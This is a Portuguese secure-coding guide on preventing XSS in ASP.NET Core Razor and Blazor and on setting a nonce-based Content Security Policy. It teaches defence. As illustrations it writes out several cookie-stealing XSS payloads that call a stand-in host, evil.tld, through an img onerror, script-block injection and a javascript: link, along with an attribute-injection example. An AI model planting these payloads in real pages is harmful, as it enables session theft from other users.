XSS e Content Security Policy

O Razor codifica tudo que você imprime — e é justamente por isso que XSS em .NET quase nunca nasce de esquecimento. Nasce de uma exceção deliberada: um Html.Raw para "corrigir" a exibição, um dado interpolado dentro de um bloco de script, uma URL montada na mão.

ASP.NET Core 10 Leitura: ~11 min Nível: essencial

O que você já ganha de graça

Toda expressão Razor escrita com @ passa pelo HtmlEncoder antes de chegar na resposta. Não existe configuração para ligar isso — é o comportamento padrão de qualquer .cshtml e .razor:

Comentarios.cshtmlCSHTML
@{
    var comentario = "<script>alert(1)</script>";
}

<p>@comentario</p>
HTML que chega no navegadorHTML
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>

O usuário vê o texto literal <script>alert(1)</script> na tela. O navegador nunca chega a interpretar aquilo como uma tag, porque os caracteres que abrem um elemento foram substituídos por entidades. O mesmo vale para atributos escritos via Tag Helpers e para o binding do Blazor.

Na prática isso significa que o caminho padrão é seguro. A pergunta útil, então, não é "onde eu esqueci de codificar?" — é "onde o meu código saiu do caminho padrão?".

Html.Raw: a saída de emergência

A história costuma ser sempre a mesma. O campo "bio" do perfil aceita negrito e link, alguém salva HTML no banco, a tela mostra as tags como texto e a correção óbvia aparece:

Perfil.cshtml — XSS armazenadoCSHTML
<div class="bio">
    @Html.Raw(Model.Bio)
</div>

Funciona lindamente para <b>desenvolvedor</b>. E funciona igualmente bem para isto, salvo por qualquer usuário cadastrado:

conteúdo da bioHTML
<img src=x onerror="fetch('https://evil.tld/c?d='+document.cookie)">

Repare que o payload não usa <script>. Não precisa: atributo de evento executa em qualquer elemento, e um <img> com src quebrado dispara o onerror na hora. É por isso que "eu filtro a palavra script" nunca funcionou — a lista de vetores inclui onerror, onload, onfocus, onanimationstart, <svg>, <iframe>, e cresce a cada versão de navegador.

O ponto central: XSS armazenado roda no navegador de outra pessoa, com a sessão dela. Se um administrador abre o perfil, o script age como administrador — cria usuário, muda permissão, exporta dados. Não é "um alert feio na tela".

Quando você realmente precisa aceitar HTML

Editor rich text é um caso legítimo. A resposta certa não é confiar, é sanitizar no servidor antes de salvar, com uma biblioteca que trabalha por allowlist de tags e atributos:

PerfilService.csC#
// dotnet add package HtmlSanitizer
using Ganss.Xss;

var sanitizer = new HtmlSanitizer();
sanitizer.AllowedTags.Clear();
sanitizer.AllowedTags.UnionWith(["b", "i", "em", "strong", "p", "br", "ul", "li", "a"]);
sanitizer.AllowedAttributes.Clear();
sanitizer.AllowedAttributes.Add("href");
sanitizer.AllowedSchemes.Clear();
sanitizer.AllowedSchemes.UnionWith(["http", "https"]);

usuario.Bio = sanitizer.Sanitize(bioEnviada);
Sanitize na entrada, não na exibição

Sanitizar só na hora de renderizar significa que o payload continua no banco, esperando o próximo lugar que exibir aquele campo sem passar pelo sanitizador — um e-mail, um relatório, um painel administrativo. Limpe antes de persistir e mantenha o Html.Raw restrito a esse campo já sanitizado.

O equivalente no Blazor

No Blazor a saída de emergência tem outro nome, e é fácil não reconhecer o risco por causa disso:

Perfil.razorRAZOR
@((MarkupString)Model.Bio)   // mesmo risco do Html.Raw

Encoding é contextual — e o do Razor é HTML

Aqui mora a parte que pega gente experiente. O HtmlEncoder foi feito para um contexto: texto dentro do corpo do HTML. Colocar o resultado dele em outro contexto vai de "quebra o layout" a "não protege nada", dependendo de onde você colou o valor.

ContextoO encoding do Razor resolve?
Texto no corpo — <p>@valor</p>Sim
Atributo entre aspas — title="@valor"Sim
Atributo sem aspas — class=@valorNão — espaço não é codificado
Dentro de <script>Não — o navegador não decodifica entidades ali
href / srcNão impede javascript:
Dentro de <style> ou style=""Não

Bloco de script: o pior lugar para interpolar

Index.cshtmlCSHTML
<script>
    var nome = "@Model.Nome";
    var id   = @Model.CodigoExterno;
</script>

Dentro de um elemento <script> o navegador não interpreta entidades HTML. Então a primeira linha nem chega a proteger nem a funcionar direito: um nome com aspas ou acento vira &quot; e &#xE9; literalmente dentro da string JavaScript. O usuário vê lixo na tela, abre um chamado, e alguém "resolve" trocando por Html.Raw — que é exatamente o buraco.

A segunda linha é pior, porque é injeção direta: sem aspas em volta, o valor não é dado, é código. Se CodigoExterno for um texto vindo do usuário, 1;fetch('https://evil.tld?c='+document.cookie) executa sem precisar de um único caractere que o encoder codifique.

A saída recomendada é não misturar as linguagens: passe o dado por atributo e leia no JavaScript.

Index.cshtmlCSHTML
<div id="dados" data-nome="@Model.Nome" data-id="@Model.CodigoExterno"></div>
<script src="~/js/perfil.js"></script>
wwwroot/js/perfil.jsJS
const dados = document.getElementById("dados").dataset;

// textContent trata como texto; innerHTML trataria como marcação.
document.getElementById("saudacao").textContent = `Olá, ${dados.nome}`;

Para objetos maiores, o caminho limpo é serializar num bloco de dados — Json.Serialize usa o System.Text.Json, que por padrão escapa <, > e & para a forma \u003C e companhia. Ou seja, não existe </script> possível dentro da saída:

Index.cshtmlCSHTML
<script id="estado" type="application/json">@Json.Serialize(Model.Estado)</script>
Cuidado com UnsafeRelaxedJsonEscaping

É comum ligar esse encoder para "parar de escapar os acentos" no JSON. Ele também para de escapar <, > e & — e é justamente esse escape que impede um valor de fechar o bloco com </script>. Se o seu JSON é embutido em página, o nome Unsafe está falando sério.

Atributo sem aspas

Espaço não é caractere perigoso em HTML — logo, o encoder não mexe nele. Sem aspas delimitando, o valor termina no primeiro espaço e o resto vira outro atributo:

valor = a onmouseover=alert(1)CSHTML
<div class=@valor>    // vira: <div class=a onmouseover=alert(1)>

A correção é trivial e vale como regra fixa: todo atributo entre aspas duplas, sempre.

URLs: o encoding não olha o esquema

Um link cujo destino vem do usuário — site do perfil, "voltar para", redirect de login — é um vetor clássico, porque javascript: não contém nenhum caractere que o HtmlEncoder toque:

Perfil.cshtmlCSHTML
<a href="@Model.Site">Site do usuário</a>

// Site = "javascript:fetch('https://evil.tld?c='+document.cookie)"
UrlSegura.csC#
public static string? Externa(string? valor) =>
    Uri.TryCreate(valor, UriKind.Absolute, out var uri)
    && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps)
        ? uri.AbsoluteUri
        : null;

Allowlist de esquema, igual à allowlist de coluna do item anterior: você não tenta reconhecer o que é perigoso (javascript:, data:, vbscript: e as variações com espaço, tabulação e maiúscula no meio), você aceita só http e https.

DOM XSS: quando o servidor está fora da jogada

Este não aparece em nenhuma revisão de código C#, porque o problema está no .js. A API devolve JSON corretamente, e o front-end joga o valor no DOM como marcação:

wwwroot/js/lista.jsJS
el.innerHTML = "<h2>" + item.titulo + "</h2>";   // executa o payload
el.textContent = item.titulo;                    // não executa nada

Os equivalentes em framework são dangerouslySetInnerHTML no React, v-html no Vue e bypassSecurityTrustHtml no Angular. Todos são bem nomeados de propósito — cada um deles merece a mesma pergunta que o Html.Raw: de onde veio esse HTML?

Fora do Razor: Minimal APIs e e-mails

Quando você monta HTML na mão, não existe encoding automático. Um endpoint que devolve conteúdo com text/html é XSS refletido puro:

Program.csC#
app.MapGet("/busca", (string q) =>
    Results.Content($"<h1>Você buscou: {q}</h1>", "text/html"));
Program.csC#
app.MapGet("/busca", (string q, HtmlEncoder encoder) =>
    Results.Content($"<h1>Você buscou: {encoder.Encode(q)}</h1>", "text/html"));

O HtmlEncoder está registrado no contêiner por padrão — receba por injeção em vez de usar HtmlEncoder.Default, assim ele respeita a configuração da aplicação. A mesma regra vale para corpo de e-mail transacional, geração de PDF a partir de HTML e qualquer template montado com StringBuilder.

Acentos virando &#xE9; na resposta

O encoder padrão só considera seguro o Basic Latin, então todo acento sai como entidade numérica. É correto, mas verboso. Se isso incomoda, amplie a faixa — e garanta que a página declara <meta charset="utf-8">, porque é ela que impede o navegador de adivinhar outro charset:

Program.csC#
builder.Services.AddSingleton<HtmlEncoder>(
    HtmlEncoder.Create(allowedRanges: [
        UnicodeRanges.BasicLatin,
        UnicodeRanges.Latin1Supplement]));

Content Security Policy: a rede de segurança

Tudo acima trata a causa. A CSP trata a consequência: ela é um cabeçalho que diz ao navegador de onde ele pode carregar e executar código. Se um XSS passar — e um dia passa —, é a CSP que decide se o payload roda ou morre no console.

Ela não substitui encoding. É camada, não conserto.

A diretiva que anula tudo

Antes da política, o aviso mais importante: script-src 'self' 'unsafe-inline' é, para efeito de XSS, quase o mesmo que não ter CSP. O bloqueio de script inline é a proteção contra XSS refletido e armazenado; liberar inline devolve exatamente o que o atacante precisa.

E é o caminho que quase todo mundo pega, porque sem ele o site quebra: aquele <script> no fim do layout, o handler onclick no botão, o snippet de analytics. A alternativa correta é o nonce — um valor aleatório gerado por requisição, que autoriza nominalmente os blocos que você escreveu:

Program.cs — antes de UseStaticFilesC#
app.Use(async (context, next) =>
{
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
    context.Items["csp-nonce"] = nonce;

    context.Response.Headers.ContentSecurityPolicy =
        "default-src 'self'; " +
        $"script-src 'self' 'nonce-{nonce}'; " +
        "style-src 'self'; " +
        "img-src 'self' data:; " +
        "connect-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self'; " +
        "frame-ancestors 'none'";

    await next();
});
_Layout.cshtmlCSHTML
@{ var nonce = Context.Items["csp-nonce"] as string; }

<script nonce="@nonce">
    // bloco inline autorizado nominalmente
</script>

O nonce muda a cada resposta. Um script injetado por XSS não tem como adivinhá-lo — e sem o atributo correto, o navegador simplesmente não executa.

DiretivaPor que ela importa
default-src 'self'Base para tudo que não tiver diretiva própria
script-srcO coração da proteção contra XSS — sem 'unsafe-inline'
object-src 'none'Mata <embed>, <object> e plugins legados
base-uri 'self'Impede que uma tag <base> injetada sequestre todos os caminhos relativos
form-action 'self'Impede que um formulário injetado poste credenciais em outro domínio
frame-ancestors 'none'Anti-clickjacking — substituto moderno do X-Frame-Options
connect-srcLimita para onde fetch e WebSocket podem falar — dificulta a exfiltração

Ligar sem quebrar o site

Nunca publique uma CSP direto em modo bloqueio numa aplicação existente. Existe um cabeçalho gêmeo que só reporta, sem impedir nada:

Program.csC#
// Fase 1: observar. Nada é bloqueado, tudo é reportado no console.
context.Response.Headers.ContentSecurityPolicyReportOnly = politica;

Rode assim por alguns dias, colete as violações e você terá o inventário real do que a aplicação carrega — geralmente com surpresas: uma tag de marketing que ninguém lembrava, um CDN de fonte, um handler inline num Partial antigo. Só depois troque para ContentSecurityPolicy.

Blazor precisa de ajustes

Blazor WebAssembly exige 'wasm-unsafe-eval' em script-src. E Blazor Web App já envia frame-ancestors 'self' por padrão — para endurecer, use AddInteractiveServerRenderMode(o => o.ContentSecurityFrameAncestorsPolicy = "'none'") em vez de duplicar o cabeçalho.

Os acompanhantes

Program.csC#
context.Response.Headers.XContentTypeOptions = "nosniff";
context.Response.Headers["Referrer-Policy"] = "strict-origin-when-cross-origin";

O nosniff merece uma linha de explicação: sem ele, um navegador pode ignorar o Content-Type que você declarou e adivinhar pelo conteúdo. Um endpoint que devolve texto do usuário como text/plain pode acabar sendo interpretado como HTML — e aí você tem XSS numa resposta que nem era uma página.

HttpOnly: o que sobra depois do XSS

Cookie de autenticação com HttpOnly não é legível por JavaScript, então o payload não consegue simplesmente roubar a sessão e reusá-la de outro lugar. Não impede o ataque — o script ainda age como o usuário enquanto a página está aberta —, mas reduz muito o alcance. Isso já vem certo no Identity e foi tema do item 01.

Como verificar

Comece pelo inventário das exceções deliberadas. Cada ocorrência abaixo é uma decisão consciente que alguém tomou — e que merece uma justificativa:

terminalbash
grep -rn "Html.Raw\|MarkupString\|HtmlString(" --include="*.cshtml" --include="*.razor" --include="*.cs" .

# Dados do servidor dentro de bloco de script
grep -rn "UnsafeRelaxedJsonEscaping" --include="*.cs" .

# DOM XSS no front-end
grep -rn "innerHTML\|document.write\|outerHTML" --include="*.js" wwwroot/

Depois confirme os cabeçalhos no ambiente publicado — o que vale é o que sai do servidor real, não o que está no Program.cs:

PowerShellPOWERSHELL
(Invoke-WebRequest https://seusite.com.br).Headers |
    Format-List Content-Security-Policy, X-Content-Type-Options, Referrer-Policy

Por fim, abra o site com o DevTools na aba Console. A CSP reporta cada violação com a diretiva que bloqueou e o recurso ofensor — é a ferramenta de diagnóstico mais direta que existe para esse cabeçalho.

Checklist

  • Cada Html.Raw e MarkupString do projeto tem origem conhecida e justificada
  • HTML vindo de usuário é sanitizado por allowlist antes de salvar
  • Nenhum dado do servidor interpolado dentro de <script> — via data-* ou Json.Serialize
  • UnsafeRelaxedJsonEscaping não é usado em JSON embutido em página
  • Todos os atributos HTML entre aspas duplas
  • href/src dinâmicos validados por allowlist de esquema (http/https)
  • Front-end usa textContent em vez de innerHTML para dado de API
  • HTML montado fora do Razor passa por HtmlEncoder injetado
  • CSP publicada sem 'unsafe-inline' em script-src, usando nonce por requisição
  • object-src 'none', base-uri 'self', form-action 'self' e frame-ancestors definidos
  • Rodou em Content-Security-Policy-Report-Only antes de bloquear
  • X-Content-Type-Options: nosniff e Referrer-Policy presentes
  • Cookie de autenticação com HttpOnly
